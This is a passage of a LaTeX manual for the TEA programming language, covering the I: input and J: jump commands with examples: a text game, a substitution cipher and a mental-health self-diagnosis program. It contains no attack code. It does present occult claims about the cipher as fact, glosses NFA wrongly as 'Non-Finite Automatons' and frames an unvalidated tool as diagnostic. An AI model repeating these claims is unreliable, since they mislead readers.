  \begin{tcbverbatim}[title=I: EXAMPLE 7: Testing Interactive TEA program]
EXPERIMENTS|< 13:20:05 $>* tttt -c "i:{What is your name please? }|i:|x:{Hello }"
What is your name please? Joseph
Hello Joseph
EXPERIMENTS|< 13:20:29 $>*   
  \end{tcbverbatim}


For TEA, then, the \textbf{Minimum Basic Input Program} (LOCMBIP)\cite{lutalo2020dnap} becomes the following program:


  
  \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=I: EXAMPLE 8: Minimum Basic Input Program (LOCMBIP): Name Prompt Program]
  \begin{lstlisting}[language=TEA]
i:{What is your name please? }|i:
   \end{lstlisting}
  \end{tcolorbox}
\end{figure} 


Such as we see in the screenshot below:




  \begin{tcbverbatim}[title=I: EXAMPLE 9: Testing Name Prompt TEA program]
EXPERIMENTS|< 13:27:52 $>* tttt -c "i:{What is your name please? }|i:"
What is your name please? John Doe
John Doe
EXPERIMENTS|< 13:28:05 $>*   
  \end{tcbverbatim}


Finally, note that I: is not only the ONLY way to block a program and prompt for input from the user, but is also the only means to make a TEA process pause, while it optionally displays some [useful] message (whatever is current AI). It makes TEA programs INTERACTIVE. A great example of I: in action is the \textbf{ZHA}\cite{lutalo2025unraveling} q-AGI personal assistant that ships with standard TEA (tttt) package on Linux/Unix.

  

  
  \subsection{The \textbf{I*..} Interact Command EXTENSIONS}
  
 
 
Concerning using the GUI-friendly \textbf{I*..} TEA commands. Note that, for all practical purposes, apart from the fact that \textbf{I*:} and \textbf{I*!:} both present an input prompt window (in WEB TEA particularly, otherwise a normal CLI prompt) without any prompt message (if invoked when also AI is empty or unset) --- which defers from \textbf{I:} and \textbf{I!:} behavior --- otherwise, all \textbf{I*..} commands work the same for TEA anywhere; essentially, they render a GUI window prompting the user for some input, which is then set as the AI/IO.
 
That said, note that, for WEB TEA, using this feature doesn't require configuring anything more than happens during the installation of TEA. Otherwise, for command-line TEA, especially where the installation didn't occur via the standard installation scripts or method, one might want to ensure they have installed the extra external requirement to make the GUI/window feature work well as expected. Details follow in the next note...
 
 {\centering
 
 \vspace{5cm}
\fbox{
\begin{minipage}{0.9\textwidth}
\textbf{CONCERNING TK and the Python Dependence for these TEA features:}\\


 \begin{tcolorbox}[title=What is Tkinter?,colback=blue!5!white,colframe=blue!75!black]
\textbf{Tkinter} is short for \textit{Tk interface}, and it serves as Python's standard interface to the \textbf{Tk GUI toolkit}, which originates from the \textbf{Tcl/Tk} system.

\begin{itemize}
  \item \textbf{Tk} — A cross-platform GUI toolkit originally developed for the Tcl scripting language.
  \item \textbf{Tcl} — Stands for \textit{Tool Command Language}, used for scripting and rapid prototyping.
  \item \textbf{Tkinter} — Python's built-in wrapper around Tk, enabling the creation of graphical user interfaces (GUIs) without external dependencies.
\end{itemize}

Thus, in full spirit:
\[
\text{Tkinter} = \text{Python's interface to the Tk GUI toolkit from Tcl/Tk}
\]

Tkinter is included in the standard Python distribution and allows developers to build windows, dialogs, buttons, and other GUI elements with minimal setup.
\end{tcolorbox}  


To be able to run these commands on the default/bare standard installation of TEA on any native operating system, ensure to also install the one requirement the TEA interpreter requires: the \textbf{TK} interface, which, for the Python base for CLI TEA is installable via command: \texttt{sudo apt-get install python3-tk} (*NIXes).


\end{minipage}}
\\
%}
}
 
 
\vspace{2em}
 
 
 That said, this is a very useful and important feature in TEA programming, and examples might help shed more light about how powerful and special it is to wield anywhere TEA can be used.
  


\section{EXAMPLE APPLICATIONS of I:}
\label{SECEXAMPI}

  
The first example we shall consider, directly builds upon the example of a GAME that we saw in the last section for \textbf{H:} --- refer to \textbf{\hyperref[SECEXAMP1H]{Section \ref{SECEXAMP1H}}}.


\subsection{EXAMPLE 1: \textbf{GRAPHICAL GAME PROGRAMMING:} [pure-GUI] TEXT ADVENTURE GAME: BOOBS `N' TRAPS\cite{lutalo_2025_rpg}}
\label{SECEXAMP1I}

\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/bnt_cli_new.png}\\
   \caption{BOOBS N TRAPS game running in enhanced I*.. mode}
  \label{FIGBNT2}
  \end{center}
\end{figure}

The only major difference between this version and the one depicted in \textbf{\hyperref[SECEXAMP1H]{Section \ref{SECEXAMP1H}}} ---  \textbf{\hyperref[FIGH]{Figure \ref{FIGH}}}, is that this version replaces all instances where we display a user-input prompt using the idiom \texttt{i:PROMPT\_MESSAGE | i:} with \texttt{i:PROMPT\_MESSAGE | i*:}. Otherwise, as might be seen by running the modified version at:

\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=.&fc=https://raw.githubusercontent.com/mcnemesis/cli_tttt/refs/heads/master/sample_TEA_programs/games/native_boobs_n_traps}

\vspace{1em}

All the other features of the game work as before, and the same for WEB and CLI TEA. However, this later version is preferable, because it replaces the [somewhat ugly] command-line user-experience in the original implementation with one exactly similar to what one experiences on the WEB.

For a demonstration of this later improvement, compare the original game [not using I*.. commands] as shown in \textbf{\hyperref[FIGBNT1]{Figure \ref{FIGBNT1}}} Vs the enhanced one as shown in \textbf{\hyperref[FIGBNT2]{Figure \ref{FIGBNT2}}}.


\begin{figure}[H]
  \begin{center}
   \includegraphics[height=0.8\textheight]{resources/images/bnt_cli_original.png}\\
   \caption{BOOBS N TRAPS game running in original mode}
  \label{FIGBNT1}
  \end{center}
\end{figure}





And for completeness's sake, compare this against the game as it runs on WEB TEA (same for original code version and this enhanced one), as shown in \textbf{\hyperref[FIGBNT3]{Figure \ref{FIGBNT3}}}.


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/bnt_cli_web.png}\\
   \caption{BOOBS N TRAPS game running on WEB}
  \label{FIGBNT3}
  \end{center}
\end{figure}




\subsection{EXAMPLE 2: \textbf{COMPUTATIONAL MYSTICISM:} The LUMTAUTO Occult Language Message Encoder}
\label{SECEXAMP12}


This next use-case and non-trivial TEA program example is introduced properly in a recent modern grimoire\cite{lutalo_2025_grimlumtauto} on applying the TEA language in modern Magick, Occult Sciences and Computational Mysticism --- \textbf{NOVUS MODERNUS GRIMOIRE LUMTAUTO MAGIA} is a 2025 manuscript distilling wisdom from across all ages, into a single authoritative work on magical languages and their applications\cite{lutalo_2025_grimlumtauto}. 


\vspace{2em}

5 Languages are being introduced in that book, including; \textbf{lumtauto}
(see \textbf{Section 2.6.2} of \cite{lutalo_2025_grimlumtauto}), \texttt{grand myrrh} (\textbf{Section 3}\cite{lutalo_2025_grimlumtauto}), \texttt{ozin} (\textbf{Section 4}\cite{lutalo_2025_grimlumtauto}), \texttt{crypt of medina} (\textbf{Section 5}\cite{lutalo_2025_grimlumtauto}), and \texttt{miti} (\textbf{Section 6}\cite{lutalo_2025_grimlumtauto}) --- each of them, a unique, and multi-purpose system of performing certain operations using the ordinary Latin Alphabet, but also its mappings to various forms of expressions such as sacred or magical mantras and aural utterances, but also visual expressions such as glyphs encoding verbal and abstract knowledge or information, but also pictograms such as sigils\cite{lutalo_2025_grimlumtauto} that encode information that might not be readily accessible to the conscious mind, but otherwise processeable by the subconscious mind. 

\vspace{2em}

From the perspective of programming using TEA, the most exciting thing about all kinds of magical systems, problems and solutions presented in that book, is that, one can readily apply their knowledge of TEA programming --- especially the ability to call up and use a certain TEA primitive instruction based on otherwise usually complex tasks and non-trivial sequence-processing, sequence-generation or sequence analysis fundamental tasks. That one can swiftly learn and apply modern Chaos Magick once they know and can use the TEA computer programming language, is a true bonus for investment in this language and its applications. In \cite{lutalo_2025_grimlumtauto}, TEA program examples are presented, introduced and links to live instances of TEA programs that one can also edit and run with their own custom payloads, sequences and perhaps evolve for other tasks, are offered too.

\vspace{2em}

However, we shall only focus on just one example of applying one of the languages the grimoire introduces; \textbf{LUMTAUTO}.


\subsubsection{A Formal Definition of LUMTAUTO}


\begin{transf}[The \textbf{Magical Language \texttt{Lumtauto}}]
\label{TRANSFLUMTAUTO}
If $\Theta^n$ is a sequence of $n > 0$ symbols (the original message) spanning the \textbf{Latin Alphabet} or the symbol set $\psi_{az}$, such that:

\begin{multline}
\label{EQLATINALPHABET}
\psi_{az} = \langle a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z \rangle: \invpi(\psi_{az}) = 26 \\ \quad \land \quad \Theta^n:\mathbb{N} \times \psi_{az}
\end{multline}

then the following transformation:

\begin{trans}
\label{TRANSLUMTAUTO}
$\Theta^n \xrightarrow{O_{lauto(\cdot)}} \Theta^* = \Omega^n;$\\
$\invpi(\Theta^n) = \invpi(\Theta^*) = \invpi(\Omega^n) = n$\\
$\land \quad \forall \theta_{i \in [1,n]} \in \Theta^n \quad \exists \omega_{j \in [1,n]} \in \Omega^n \quad \land \quad \invpi(\theta_i \in \psi(\Theta^n)) = \invpi(\omega_i \in \psi(\Omega^n)) = 1$\\
$\land \quad \forall \alpha \in \Theta^n: \invpi(\alpha \in \Theta^n) = f_\alpha \implies \alpha \in \Omega^n: \invpi(\alpha \in \Omega^n) = f_\alpha$\\
$\land \quad \overset{>}{\Theta^n} = \overset{>}{\Omega^n} \lor \overset{>}{\Theta^n} \neq \overset{>}{\Omega^n}$\\
$\land \quad \tilde{A}(\Theta^n \rightarrow \Omega^n) > 1 \qed$
\end{trans}

is guaranteed to always produce/generate a derivative message --- $\Theta^*$ that has the following properties:

{
\normalsize

\begin{multline}
\label{EQLUMTAUTO}
\forall \alpha \in \Theta^n \implies \beta \in \Omega^n \implies \begin{cases}
a \rightarrow u, & \\ \text{what happened: }\\ a \in \Theta^n \text{ became } u \in \Omega^n\\ \land \quad I(a,\Theta^n) = I(u,\Omega^n) = i \quad iff \quad \theta_{i=I(u,\Omega^n)} = a\\
b \rightarrow y, & \\ \text{what happened: }\\b \in \Theta^n \text{ became } y \in \Omega^n\\ \land \quad I(b,\Theta^n) = I(u,\Omega^n) = i \quad iff \quad \theta_{i=I(y,\Omega^n)} = b\\
c \rightarrow x,& \\
d \rightarrow w,& \\
e \rightarrow o,& \\
f \rightarrow f,& \\
g \rightarrow t,& \\
h \rightarrow s,& \\
i \rightarrow i,& \\
j \rightarrow q,& \\
k \rightarrow p,& \\
l \rightarrow l,& \\
m \rightarrow n,& \\
n \rightarrow m,& \\
o \rightarrow e,& \\
p \rightarrow k,& \\
q \rightarrow j,& \\
r \rightarrow r,& \\
s \rightarrow h,& \\
t \rightarrow g,& \\
u \rightarrow a,& \\
v \rightarrow v,& \\
w \rightarrow d,& \\
x \rightarrow c,& \\
y \rightarrow b,& \\
z \rightarrow z& \\ \text{what happened: }\\z \in \Theta^n \text{ became } z \in \Omega^n\\ \land \quad I(z,\Theta^n) = I(z,\Omega^n) = i \quad iff \quad \theta_{i=I(z,\Omega^n)} = z\\
\end{cases}
\end{multline}
$\qed$
}

And so that, the resultant [transformed] message, $\Theta^* = \Omega^n$, despite being the same exact length as the original message, is not exactly equivalent to it, and is an instance of text in the language \textbf{LUMTAUTO}.

\end{transf}


\vspace{2em}


With that formal, but also computable definition of the transformer depicted in \textbf{\hyperref[TRANSFLUMTAUTO]{Transformer \ref{TRANSFLUMTAUTO}}}, note that we can for example take a message encoded using the \textbf{Extended Latin Alphabet}(ELA)\cite{lutalo_2025_grimlumtauto}, and by applying that transformer to it, produce another ELA message, but whose contents are provably different, though, computationally or semantically reversible back to the original message in ordinary English for example. Perhaps an illustration using a transformation applying \textbf{\hyperref[TRANSFLUMTAUTO]{Transformer \ref{TRANSFLUMTAUTO}}} will help make this clear:

\vspace{2em}

\begin{trans}
$\langle L, A, N, G, u, a, g, E, 1, 0, 1 \rangle \xrightarrow{O_{lauto}(\cdot)} \langle L, U, M, T, a, u, t, O, 1, 0, 1 \rangle$
\end{trans}


\vspace{2em}


\subsubsection{The LUMTAUTO Algorithm in TEA}
\label{SECTEALUMTAUTO}

And so that, to reproduce or apply the same transformer that enables the word "language" to be transformed into the different word "lumtauto", while leaving any characters or symbols not in the basic Latin Alphabet symbol set ($\psi_{26}$) untouched, the following basic higher-order transformer definition using mere TEA source code would suffice:

\vspace{2em}

{
 %\small
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: The LUMTAUTO Transformer, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
i:{language} # given some message
v:vMESSAGE #store the original message

#COMPLETE LANGuage -> LUMTauto TRANSFORM
#lumtauto-TRANSFORM [lower-case]
#start transforming via the lumtauto cipher algorithm
r!:a:_%_ #U
r!:b:_%%_ #Y
r!:c:_%%%_ #X
r!:d:_%%%%_ #W
r!:e:_%%%%%_ #O
r!:f:_%%%%%%_ #F
r!:g:_%%%%%%%_ #T
r!:h:_%%%%%%%%_ #S
r!:i:_%%%%%%%%%_ #I
r!:j:_%%%%%%%%%%_ #Q
r!:k:_%%%%%%%%%%%_ #P
r!:l:_%%%%%%%%%%%%_ #L
r!:m:_%%%%%%%%%%%%%_ #N
r!:n:m
r!:o:e
r!:p:k
r!:q:j
r!:r:r
r!:s:h
r!:t:g
r!:u:a
r!:v:v
r!:w:d
r!:x:c
r!:y:b
r!:z:z
#complete the transform
r!:_%_:u
r!:_%%_:y
r!:_%%%_:x
r!:_%%%%_:w
r!:_%%%%%_:o
r!:_%%%%%%_:f
r!:_%%%%%%%_:t
r!:_%%%%%%%%_:s
r!:_%%%%%%%%%_:i
r!:_%%%%%%%%%%_:q
r!:_%%%%%%%%%%%_:p
r!:_%%%%%%%%%%%%_:l
r!:_%%%%%%%%%%%%%_:n
#FINISHED: for lower-case

#j:lFINISHED

#COMPLETE LUMTAUTO TRANSFORM [for uppercase]
#LUMTAUTO-TRANSFORM [upper-case]
#start transforming via the LUMTAUTO cipher algorithm
r!:A:_%_ #U
r!:B:_%%_ #Y
r!:C:_%%%_ #X
r!:D:_%%%%_ #W
r!:E:_%%%%%_ #O
r!:F:_%%%%%%_ #F
r!:G:_%%%%%%%_ #T
r!:H:_%%%%%%%%_ #S
r!:I:_%%%%%%%%%_ #I
r!:J:_%%%%%%%%%%_ #Q
r!:K:_%%%%%%%%%%%_ #P
r!:L:_%%%%%%%%%%%%_ #L
r!:M:_%%%%%%%%%%%%%_ #N
r!:N:M
r!:O:E
r!:P:K
r!:Q:J
r!:R:R
r!:S:H
r!:T:G
r!:U:A
r!:V:V
r!:W:D
r!:X:C
r!:Y:B
r!:Z:Z
#complete the transform
r!:_%_:U
r!:_%%_:Y
r!:_%%%_:X
r!:_%%%%_:W
r!:_%%%%%_:O
r!:_%%%%%%_:F
r!:_%%%%%%%_:T
r!:_%%%%%%%%_:S
r!:_%%%%%%%%%_:I
r!:_%%%%%%%%%%_:Q
r!:_%%%%%%%%%%%_:P
r!:_%%%%%%%%%%%%_:L
r!:_%%%%%%%%%%%%%_:N
#FINISHED: for upper-case

#Complete Original Message NOW Transformed

#then store transformed message :)
v:vTRANSFORMED_MESSAGE #such as "lumtauto"
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA Program: The LANGuage to LUMTauto transformer}
  \label{FIGLUMTAUTOTEACODE}
  
  }

\vspace{2em}

\textbf{\hyperref[FIGLUMTAUTOTEACODE]{Figure \ref{FIGLUMTAUTOTEACODE}}} is the \textbf{source-code} of the non-interactive TEA program implementing this algorithm, and which, when actually cleaned of comments and MINIFIED and rendered interactive, would be the program depicted in  \textbf{\hyperref[FIGLUMTAUTOTEACODE_CLEAN]{Figure \ref{FIGLUMTAUTOTEACODE_CLEAN}}}. However, and in case one wishes to look at the code, modify or run \textbf{an interactive version} of it like on the Linux, Unix, Windows or MAC OS command-line or on the WEB, the most recent version should be what you might find or run directly and live via:
  
  
\vspace{2em}

 \url{https://tea.nuchwezi.com/?i=put+your+message+here&fc=https://gist.githubusercontent.com/mcnemesis/ae9d6226d49f5a8601a84241a08f07c8/raw/lumtauto_language_transformer.tea}

\vspace{1em}


\textbf{ALTERNATIVELY} just use the short-link: \url{https://bit.ly/lumtauto}

\vspace{2em}

{
 %\small
  \begin{tcolorbox}[teaterminalstyle, title=CLEAN TEA Program: The LUMTAUTO Transformer, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
f!:^$:lDONTPROMPT|i!:{Enter Message to be Encoded:}|i*:|i:{language}|l:lDONTPROMPT|v:vMESSAGE|r!:a:_%_|r!:b:_%%_|r!:c:_%%%_|r!:d:_%%%%_|r!:e:_%%%%%_|r!:f:_%%%%%%_|r!:g:_%%%%%%%_|r!:h:_%%%%%%%%_|r!:i:_%%%%%%%%%_|r!:j:_%%%%%%%%%%_|r!:k:_%%%%%%%%%%%_|r!:l:_%%%%%%%%%%%%_|r!:m:_%%%%%%%%%%%%%_|r!:n:m|r!:o:e|r!:p:k|r!:q:j|r!:r:r|r!:s:h|r!:t:g|r!:u:a|r!:v:v|r!:w:d|r!:x:c|r!:y:b|r!:z:z|r!:_%_:u|r!:_%%_:y|r!:_%%%_:x|r!:_%%%%_:w|r!:_%%%%%_:o|r!:_%%%%%%_:f|r!:_%%%%%%%_:t|r!:_%%%%%%%%_:s|r!:_%%%%%%%%%_:i|r!:_%%%%%%%%%%_:q|r!:_%%%%%%%%%%%_:p|r!:_%%%%%%%%%%%%_:l|r!:_%%%%%%%%%%%%%_:n|r!:A:_%_|r!:B:_%%_|r!:C:_%%%_|r!:D:_%%%%_|r!:E:_%%%%%_|r!:F:_%%%%%%_|r!:G:_%%%%%%%_|r!:H:_%%%%%%%%_|r!:I:_%%%%%%%%%_|r!:J:_%%%%%%%%%%_|r!:K:_%%%%%%%%%%%_|r!:L:_%%%%%%%%%%%%_|r!:M:_%%%%%%%%%%%%%_|r!:N:M|r!:O:E|r!:P:K|r!:Q:J|r!:R:R|r!:S:H|r!:T:G|r!:U:A|r!:V:V|r!:W:D|r!:X:C|r!:Y:B|r!:Z:Z|r!:_%_:U|r!:_%%_:Y|r!:_%%%_:X|r!:_%%%%_:W|r!:_%%%%%_:O|r!:_%%%%%%_:F|r!:_%%%%%%%_:T|r!:_%%%%%%%%_:S|r!:_%%%%%%%%%_:I|r!:_%%%%%%%%%%_:Q|r!:_%%%%%%%%%%%_:P|r!:_%%%%%%%%%%%%_:L|r!:_%%%%%%%%%%%%%_:N|l:lFINISHED|v:vTRANSFORMED_MESSAGE|i!:{In LUMTAUTO
}|x*!: vMESSAGE|x!: {
-- becomes --
}|x*!: vTRANSFORMED_MESSAGE|i*:|y:vTRANSFORMED_MESSAGE
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{MINIFIED TEA Program: The basic LUMTAUTO transformer program source-code}
  \label{FIGLUMTAUTOTEACODE_CLEAN}
  }
  
\vspace{2em}

For our present concerns exploring how the TEA primitive command-space \textbf{I:} can be applied, note that, the Lumtauto implementation depicted in \textbf{\hyperref[FIGLUMTAUTOTEACODE_CLEAN]{Figure \ref{FIGLUMTAUTOTEACODE_CLEAN}}} is interactive, and that, for any input the user explicitly specifies, computes and then visually displays to them both the original/input sequence, and the new/transformed sequence or message, next to each other perhaps for comparison or export or input into other more complex processing and transformations such as the generation of long, utterable mantras based on plain text messages, their computed lumtauto projections, their PMSS sources and then resulting myrrh projections or auto-spell formulations, etc --- details in \textbf{grimoire lumtauto}\cite{lutalo_2025_grimlumtauto}.




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: J
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{J: JUMP}
\label{SECJ}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{JUMP}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Jump across the TEA program
	\item Process TEA \textbf{LABEL BLOCKS} --- {\small the only other TEA primitive that does this apart from \texttt{F:}}
	\item Implement Code Branching Logic based on STATIC information in the program source
	\item Another Way to Exploit Closures and Name-Spaces in TEA programming
	\item Unconditionally jump/loop back to the START of a TEA program
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{J:}}
  \label{TABTAZJ}
\end{table}


\section{SEMANTICS of J:}
\label{SECSEMJ}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

j: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{ h:REGEX } & Same as h:, but the splitting happens only at the beginning of where the contents of AI match REGEX. The original contents of AI remain preserved by this operation.\\

j:LABEL & Unconditionally jump to the location in the program under the label named LABEL.\\

\rowcolor{lightgray}\bfseries j!: & Unconditionally Return to the Start of the TEA Program\\

 \makecell[l]{j!: PARAM} & INERT (or rather, \textit{don't jump!})\\


 
 \hline
\end{tabular}
\caption{The Semantics of J:}
\label{TABSEMJ}
\end{table}


\section{NOTES about J:}
\label{SECNOTEJ}


This command is one of the few flow-control instructions in a TEA program ( the others are \texttt{f:} and \texttt{q:} ). In particular, when applied using the command or instruction signature \texttt{j:LABEL}, the TEA processor and interpreter or runtime, upon encountering any such instructions in the TEA program, shall know that the next instruction to be executed in the TEA program should be the \textbf{first TEA instruction} that follows the unique statement in the TEA program bearing an instruction with the explicit or proximate signature: \texttt{l:LABEL} --- we say ``proximate" because, as one shall find out when they read about the \textbf{LABEL} primitive command, \texttt{L:}, that, it is possible to specify a named location in a TEA program, using more than one name or label-name tag --- however, that any distinct label name can only be applied once in a program --- thus, \texttt{j:LABEL} and \texttt{j:LABEL1} or \texttt{j:LABELA} or \texttt{j:LABE\_L} are not the same, jump instructions, however, they might be able to jump to the same location within a TEA program --- these peculiarities of the TEA flow-control mechanisms shall become clearer after studying TEA LABELS\footnote{Note that the other ways to implement or exploit flow-control and branching logic in a program are via other \textbf{flow-control} instructions that can reference named locations within a TEA program --- such as the \textbf{Fork} instruction \texttt{F:} --- TEA's equivalent to the traditional \textbf{IF-ELSE} logic}.


\vspace{2em}

Consider the following illustrative and basic example exploiting mostly the label and jump TEA instructions:

\vspace{2em}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=J: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
# In case no explicit input was provided
#Skip test 1
f!:^$:LABEL
l:LABEL1
x!:{--|TEST1 FAILED: no input was given|}
j:LABEL_DONE

l:LABEL:lLABEL2
#we possibly got custom input...
x!:{--|TEST2 PASSED: you provided input|}

l:LABEL_DONE
#finish: show results of test
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\vspace{2em}

In case that program is invoked without any explicit user input, it shall return the output ``--|TEST1 FAILED: no input was given|", otherwise, if say the input ``Hello World" was given, then, it shall use the \textbf{F:} instruction on line \#1, to jump to the second labeled code block in that program --- see the instruction \texttt{l:LABEL:lLABEL2} --- and so that the program then processes the input the user provided, and thus returns something like: ``Hello World--|TEST2 PASSED: you provided input|".


\vspace{2em}

One other, somewhat related example might help cast this matter in another way...


\vspace{2em}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=J: EXAMPLE 2]
  \begin{lstlisting}[language=TEA]
i!:TEST | r:T:P | z:
f:PEST:A
j:B
l:A | x!:-KILL | q!:
l:B
x!:-OK
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\vspace{2em}


Should return ``PEST-KILL” if instruction\#2 replaces only the first occurrence of T in the AI, otherwise will return ``PESP-OK”. Note that in this example program, we see two ways to jump using labels in TEA; the first (line\#2, instruction\#4) using the Fork instruction --- \texttt{F:REGEX:LABELIFMATCH} or {F:REGEX:LABEL\_IF\_MATCH:LABEL\_IF\_NO\_MATCH}, while instruction\#5 uses the canonical Jump instruction, \texttt{J:LABEL}. 



\section{EXAMPLE APPLICATIONS of J:}
\label{SECEXAMPJ}

Because \textbf{J:} is mostly about control-flow and branching logic in a computer program, the best way to illustrate its usage would be in an example that demonstrates use of non-linear logic and/or what are sometimes also technically referred to as NFAs --- \textbf{Non-Finite Automatons}. These concepts are fundamental in much of computer science and software engineering, however, we shall keep the theory treatment brief, and instead focus on some realistic real-world problems and their potential solutions using a TEA program leveraging these concepts.

\vspace{2em}


The first example we are to look into, concerns a mental-health utility that any sane human could leverage, either for themselves or for the monitoring and analysis of the mental health profile of someone they are concerned about.
  

\subsection{EXAMPLE 1: \textbf{COMPUTATIONAL MEDICINE:} THE MENTAL HEALTH SELF-ANALYSIS TOOL}
\label{SECEXAMP1J}

  
This example is based on a framework and diagnostic tool first presented formally in a book about applying Transformatics in Psychology\cite{Lutalo2025transpsy}, known as \textbf{Transformatics for PSYCHOLOGY}, also by the author, and which was presented at the 13$^{th}$ International East African Conference on Psychology, that took place in October 2025 hosted by University of KISUBI (UNIK).

\vspace{2em}

The framework, in its simplest form, is as depicted in the following form:


\begin{figure}[H]
  \begin{center}
   \includegraphics[scale=0.9]{resources/pdfs/mental_health_diagnostics.pdf}\\
   \caption{The MENTAL HEALTH DIAGNOSIS FRAMEWORK (MHDF) --- an example of applying \textbf{Willrich Psychology}}
  \label{FIGEXAMHDF}
  \end{center}
\end{figure}


\vspace{2em}

And so, based on the tool depicted in \textbf{\hyperref[FIGEXAMHDF]{Figure \ref{FIGEXAMHDF}}}, we find that we can design an interactive computer program that could be used by someone --- especially a health counselor, a psychiatrist, a psychoanalyst, or just a general doctor --- but also by oneself; such as in situations one feels compelled, they need to sit themselves down a bit, and somewhat exhaustively cross-check their mental and social profile so as to bring to surface potential problems usually lurking underneath ordinary awareness and which, by careful enumeration in relation to ones needs and expectations, might help lead to remedies of a psychological, but also social, spiritual, material, physiological, financial kind, etc. as per the resulting profile and circumstances or context of the subject under review\footnote{Talking of the need to and contexts within which evaluating and pinning-down the psychological profile of someone might come-in handy, also consider the case of pragmatic psyops introduced and explored in the book \textbf{Grimoire Lumtauto}\cite{lutalo_2025_grimlumtauto} --- in particular, checkout \textbf{Algorithm 4} treating of Exorcism in \textbf{Chapter 4}}.

\vspace{2em}


In brief, the program we are deal with here, will help someone build a mental profile about a named entity, complete with the significant areas of concern, the ideals or specifics about what would be required or expected under normal or ideal circumstances, then what the potential challenges or actual hindrances to attaining those ideals are, and then, what first, or anticipated solutions might be. This collection of well-organized information, when thus collected and prepared, can then be presented or preserved as a kind of \textbf{Mental-Health-Profile Record} (MHPR) that can either be printed out, or which can be filed as part of a patient's or subject's diagnostic records perhaps which might be included in their EMR (Electronic Medical Records) for scenarios affiliated to managing patients in a large or conventional clinical medicine context, or which can be used to further a private counselor's file on their patient or subject as part of a thorough and perhaps long-term treatment methodology. Moreover, we shall try to keep the program as simple as possible in both its implementation, as well as how the data it collects is formatted for presentation and later re-use.

\vspace{2em}


{
 \small
  \begin{tcolorbox}[teaterminalstyle, title=TEA EXAMPLE: MENTAL HEALTH DIAGNOSIS PROGRAM v1.0.0.1, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
#!/usr/bin/tttt -fc
#-------------------------------------------#
# MHDF: Mental-Health Diagnosis Framework (v1.0)
#-----------------------------------------|
# MHDP: MENTAL HEALTH DIAGNOSIS PROGRAM v1.2
#-----------------------------------------|
# This program helps to create a mental
# profile of a named subject, for purposes
# identifying, classifying and then
# diagnosing and solving psycho-social 
# challenges the subject is facing. MHDF is
# based on a system originally developed 
# by researchers at NES [Nuchwezi Esoteric School]
# based in UGANDA. It was first introduced
# formally in the book: Transformatics for PSYCHOLOGY 
# https://bit.ly/transpsychology
#-------------------------------------------#

#show welcome message
v:vORIN
v:vWELCOME:{###########- OVERALL MENTAL HEALTH [self]DIAGNOSIS PROGRAM v1.2 -###########-Many people think they are well and healthy, until when they work through this program.-It is a simple, free, but powerful self-diagnosis tool originally meant to help a counselor or doctor quickly isolate a person's core problems and their potential holistic remedies. It can be used to help someone else, but also to help yourself-CREDIT: Dr. JWL at Nuchwezi Esoteric School.-###########}
v:vREG:-|h*!:vWELCOME:vREG
d:-|i*:


v:vWELCOME:{###########- HOW TO USE MHDP? -###########-Essentially, after this message, correctly, and suitably, but in brief, answer all questions under the 8 CATEGORIES; family, friendship, ...,mental health.The process will help you identify the gaps and major issues.- FINALLY, program will neatly print a report with all identified issues and solutions, which you can either return to later, use to build or find a lasting overall solution, or share with your trusted doctor or counselor.-NOTE THAT NONE of YOUR DATA is SHARED or STORED after using this program.-###########-WARNING: Only way to QUIT the program is to work through the entire process!-###########}
v:vREG:-|h*!:vWELCOME:vREG
d:-|i*:


y:vORIN # continue...

####[ GET BACKGROUND META-DATA ]

# First, get current date
z.:DATE | v:vDATE #store date

# Next get name of client/subject
l:lPROMPTNAME
i!:{What is the name of the Person|Client|Patient|Subject?} | i*:
d:^[ ]*$
f:^$:lPROMPTNAME
v:vCLIENT_NAME # store client name

####[ PROMPT for PROFILE DATA ]
v:vPLACEHOLDER:{_}
v:vPROF_HEADER:{MENTAL HEALTH PROFILE for [_] ON [_]:}
r*:vPROF_HEADER:vPLACEHOLDER:vCLIENT_NAME | v:vPROF_HEADER
r*:vPROF_HEADER:vPLACEHOLDER:vDATE | v:vPROF_HEADER
v:vPROFILE #store profile header...

#---------| FAMILY |------------------
###---[FAMILY: Wants ]
v:vFAM_WANTS:{} #initially empty
v:vPROMPT_FAM_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to FAMILY, what does _ WANT/NEED?}
r*:vPROMPT_FAM_WANTS:vPLACEHOLDER:vCLIENT_NAME
